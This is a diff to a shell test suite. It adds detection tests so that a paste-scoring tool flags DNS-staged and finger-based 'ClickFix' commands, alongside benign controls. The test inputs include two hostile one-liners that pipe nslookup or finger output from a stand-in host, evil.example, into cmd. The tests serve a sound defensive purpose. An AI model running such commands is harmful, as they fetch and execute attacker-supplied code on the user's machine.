@@ -6990,6 +6990,21 @@ else
 fi
 check "p132: pure-analysis modules contain no time/random calls" "0" "$rc"
 
+# ─── p133: 2026 ClickFix variants (DNS-staged, CrashFix/finger) ─────────────
+# Microsoft Threat Intelligence (Feb 2026) and follow-on write-ups describe
+# variants whose second stage arrives via nslookup output or finger.exe and is
+# piped into an interpreter -- no curl/iwr, so the download-oriented rules
+# missed them entirely.
+p133() { ./hlse_core --json paste "$1" 2>/dev/null || true; }
+p133 'nslookup -q=txt evil.example 8.8.8.8 | findstr Name | cmd' | grep -q '"score":4[0-9]\|"score":[5-9][0-9]' && rc=0 || rc=1
+check "p133: DNS-staged ClickFix (nslookup | cmd) is flagged" "0" "$rc"
+p133 'finger user@evil.example | cmd' | grep -q '"score":4[0-9]\|"score":[5-9][0-9]' && rc=0 || rc=1
+check "p133: CrashFix (finger | cmd) is flagged" "0" "$rc"
+p133 'nslookup example.com' | grep -q '"score":0' && rc=0 || rc=1
+check "p133: plain nslookup is not flagged" "0" "$rc"
+p133 'finger alice@host.example' | grep -q '"score":0' && rc=0 || rc=1
+check "p133: plain finger is not flagged" "0" "$rc"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
